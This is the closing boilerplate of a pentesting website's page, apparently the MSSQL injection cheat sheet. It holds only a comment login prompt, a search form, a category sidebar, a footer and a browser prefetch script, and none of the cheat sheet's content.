		<h3 id="reply-title" class="comment-reply-title">Leave a Reply</h3><p class="must-log-in">You must be <a href="https://pentestmonkey.net/wp-login.php?redirect_to=https%3A%2F%2Fpentestmonkey.net%2Fcheat-sheet%2Fsql-injection%2Fmssql-sql-injection-cheat-sheet">logged in</a> to post a comment.</p>	</div><!-- #respond -->
	




	
	</div>
				<!-- sidebar -->
				<div class="sideBar">
					
					<div class="nav">
						<div class="bFrameT"><i></i></div>
	<form method="get" id="searchform" action="https://pentestmonkey.net/" class="searchForm">
	<p><input type="text" name="s" id="s" class="field">
	<input type="image" src="MSSQL%20Injection%20Cheat%20Sheet%20_%20pentestmonkey_files/search.gif" alt="" title="Search" id="searchsubmit" class="btn"></p>
</form>
<h3><span>Categories</span></h3>
			<ul>
					<li class="cat-item cat-item-5"><a href="https://pentestmonkey.net/category/blog">Blog</a> (78)
</li>
	<li class="cat-item cat-item-39"><a href="https://pentestmonkey.net/category/cheat-sheet">Cheat Sheets</a> (10)
<ul class="children">
	<li class="cat-item cat-item-40"><a href="https://pentestmonkey.net/category/cheat-sheet/shells">Shells</a> (1)
</li>
	<li class="cat-item cat-item-8"><a href="https://pentestmonkey.net/category/cheat-sheet/sql-injection">SQL Injection</a> (7)
</li>
</ul>
</li>
	<li class="cat-item cat-item-7"><a href="https://pentestmonkey.net/category/contact">Contact</a> (2)
</li>
	<li class="cat-item cat-item-3"><a href="https://pentestmonkey.net/category/site-news">Site News</a> (3)
</li>
	<li class="cat-item cat-item-4"><a href="https://pentestmonkey.net/category/tools">Tools</a> (17)
<ul class="children">
	<li class="cat-item cat-item-14"><a href="https://pentestmonkey.net/category/tools/audit">Audit</a> (3)
</li>
	<li class="cat-item cat-item-16"><a href="https://pentestmonkey.net/category/tools/misc">Misc</a> (7)
</li>
	<li class="cat-item cat-item-13"><a href="https://pentestmonkey.net/category/tools/user-enumeration">User Enumeration</a> (4)
</li>
	<li class="cat-item cat-item-15"><a href="https://pentestmonkey.net/category/tools/web-shells">Web Shells</a> (3)
</li>
</ul>
</li>
	<li class="cat-item cat-item-1"><a href="https://pentestmonkey.net/category/uncategorized">Uncategorized</a> (3)
</li>
	<li class="cat-item cat-item-6"><a href="https://pentestmonkey.net/category/yaptest">Yaptest</a> (15)
<ul class="children">
	<li class="cat-item cat-item-12"><a href="https://pentestmonkey.net/category/yaptest/front-end">Front End</a> (1)
</li>
	<li class="cat-item cat-item-9"><a href="https://pentestmonkey.net/category/yaptest/installing">Installing</a> (2)
</li>
	<li class="cat-item cat-item-11"><a href="https://pentestmonkey.net/category/yaptest/overview">Overview</a> (2)
</li>
	<li class="cat-item cat-item-10"><a href="https://pentestmonkey.net/category/yaptest/using">Using</a> (8)
</li>
</ul>
</li>
			</ul>

						
						<div class="bFrameB"><i></i></div>
					</div>
					
				</div>
				<!-- /sidebar -->	
				</div>
				<!-- /content -->
				
			</div>
			<!-- /CONTENT -->	
			
		
		<!-- bottom NAVIGATION -->
		<div id="bottomNav">
		</div>
		<!-- /bottom NAVIGATION -->
		
		<!-- FOOTER -->
		<div id="footer">
		<p class="footer-menu">
         </p><ul class="menu"></ul>        <p></p>
			
<div class="credits">Powered by <a href="http://wordpress.org/">WordPress</a>. Design: <a href="http://www.baza-noclegowa.pl/">Baza Noclegowa</a>.</div>
			
		</div>
		<!-- /FOOTER -->
	</div>
		<script type="speculationrules">
{"prefetch":[{"source":"document","where":{"and":[{"href_matches":"\/*"},{"not":{"href_matches":["\/wp-*.php","\/wp-admin\/*","\/wp-uploads\/*","\/wp-content\/*","\/wp-content\/plugins\/*","\/wp-content\/themes\/baza-noclegowa\/*","\/*\\?(.+)"]}},{"not":{"selector_matches":"a[rel~=\"nofollow\"]"}},{"not":{"selector_matches":".no-prefetch, .no-prefetch a"}}]},"eagerness":"conservative"}]}
</script>


</body></html>